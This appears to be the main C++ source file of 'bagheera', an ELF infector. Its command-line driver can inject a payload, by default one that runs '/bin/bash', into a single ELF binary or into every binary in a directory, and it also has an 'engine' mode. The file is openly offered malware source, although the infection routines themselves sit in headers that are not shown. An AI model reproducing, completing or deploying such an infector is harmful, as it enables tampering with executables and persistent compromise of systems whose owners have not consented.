#include "src/includes.hpp"
#include "src/definitions.h"
#include "src/helpers.h"
#include "src/engine.h"
#include "src/infect.h"
#include "src/bagheera.hpp"

extern int errno;
extern char *optarg;
extern int opterr, optind;

int main(int argc, char *argv[])
{

    int opt;
    opterr = 0;

    std::filebuf* pbuf;
    std::ifstream inputfile;
    std::fstream elf_file;

    int payloadsz = default_payload_size();
    char *default_payload = (char *) malloc(payloadsz);
    write_default_payload(default_payload);

    
    options_t options = { 0,                      // verbose - default: no verbose                    
                          0,                      // mode - mandatory                           
                          default_payload,        // input - default: 'exec /bin/bash' payload        
                          payloadsz,              // inputsz - default: 'exec /bin/bash' payload size 
                          1,                      // outputfile - default: stdout                          
                          (std::filebuf*) NULL,   // elf - default: no file           
                          -1,                     // elfsz                
                          NULL };                 // dir - default: no dir                            


    while ((opt = getopt(argc, argv, OPTSTR)) != EOF)
      switch(opt) {
    
        case 'm':
          if ( !strcmp(optarg, ENGINE) )
            options.mode = MODE_ENGINE;
    
          else if ( !strcmp(optarg, INFECT) )
            options.mode = MODE_INFECT;
          
          else
            error_verbose(ERR_MODE, basename(argv[0]));
    
          break;



        case 'i':

          // Open file in binary mode
          inputfile.open(optarg, std::ios::binary);

          // get pointer to associated buffer object
          pbuf = inputfile.rdbuf();

          // get file size using buffer's member
          options.inputsz = pbuf->pubseekoff(0, inputfile.end, inputfile.in);
          pbuf->pubseekpos(0, inputfile.in);

          // allocate memory to contain file data
          options.input = new char[options.inputsz];

          // get file data
          pbuf->sgetn(options.input, options.inputsz);

          /*
          if (!(input_fd = open(optarg, O_RDONLY)) )
            error(ERR_INPUT_OPEN);

          options.inputsz = lseek(input_fd, 0, SEEK_END);
          lseek(input_fd, 0, SEEK_SET);

          options.input = (char *) malloc(options.inputsz);
          if (options.input == NULL )
            error(ERR_INPUT_MALLOC);
          
          if (read(input_fd, options.input, options.inputsz) != options.inputsz)
            error(ERR_INPUT_READ);
          */

          break;



        case 'o':
          //options.outputfile(optarg, std::ios::binary);
          if (!(options.output = open(optarg, O_RDWR)) )
            error(ERR_FOPEN_OUTPUT);
          
          break;



        case 'e':

          elf_file.open(optarg, std::ios::in | std::ios::out | std::ios::binary);


          options.elf = elf_file.rdbuf();

          options.elfsz = options.elf->pubseekoff(0, elf_file.end, elf_file.in);
          options.elf->pubseekpos(0, elf_file.in);

          /*
          if (!(options.elf = open(optarg, O_RDWR|O_SYNC)) )
            error(ERR_FOPEN_ELF);
          */
          break;



        case 'd':
          options.dir = opendir(optarg);

          if (options.dir == NULL)
            error(ERR_DIR_OPEN);
          
          break;
            


        case 'v':
          options.verbose = 1;
          break;



        case 'h':
        default:
          usage(basename(argv[0]), opt);
          break;
      }


    if ( !options.mode )
      error(ERR_MODE);

    if ( options.mode == MODE_INFECT)
    {
        if (options.verbose) printf("%s: starting bagheera in infect mode\n", INFO_BANNER );

        if (options.elf == NULL && options.dir != NULL)
        {
            directory_infection(&options);      
        }
        else if (options.elf != NULL && options.dir == NULL)
        {
            elf_infection(&options);
            
        }
        else{
            error(ERR_MODE_INFECT_OPTIONS);
        }
    }
    else 
    {
        if (options.verbose) printf("%s: starting bagheera in engine mode\n", INFO_BANNER );
        engine_execution(&options);
    }


    delete[] options.input;


    return EXIT_SUCCESS;
}

